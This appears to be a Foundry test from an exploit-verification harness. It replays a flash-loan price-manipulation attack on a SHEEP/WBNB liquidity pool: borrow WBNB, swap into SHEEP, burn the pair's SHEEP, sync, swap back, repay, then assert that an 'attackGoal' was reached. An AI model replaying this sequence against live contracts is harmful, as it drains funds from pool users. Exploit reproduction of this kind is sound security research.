// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
import "./Sheep.t.sol";

contract SheepVerify is SheepTest {
    function test_verify_cand002_0() public {
        uint256 amt0 = 0x216e88796771404048000;
        uint256 amt1 = 0x200000000000000000000;
        uint256 amt2 = 0x7fffffffffffffff;
        uint256 amt3 = 0x120883749d9ce62d6;
        uint256 amt4 = 0x216e8892b797964698002;
        borrow_wbnb(amt0);
        swap_pair_wbnb_sheep(amt1);
        burn_pair_sheep(amt2);
        sync_pair();
        swap_pair_sheep_wbnb(amt3);
        payback_wbnb(amt4);
        require(attackGoal(), "Attack failed!");
    }
}
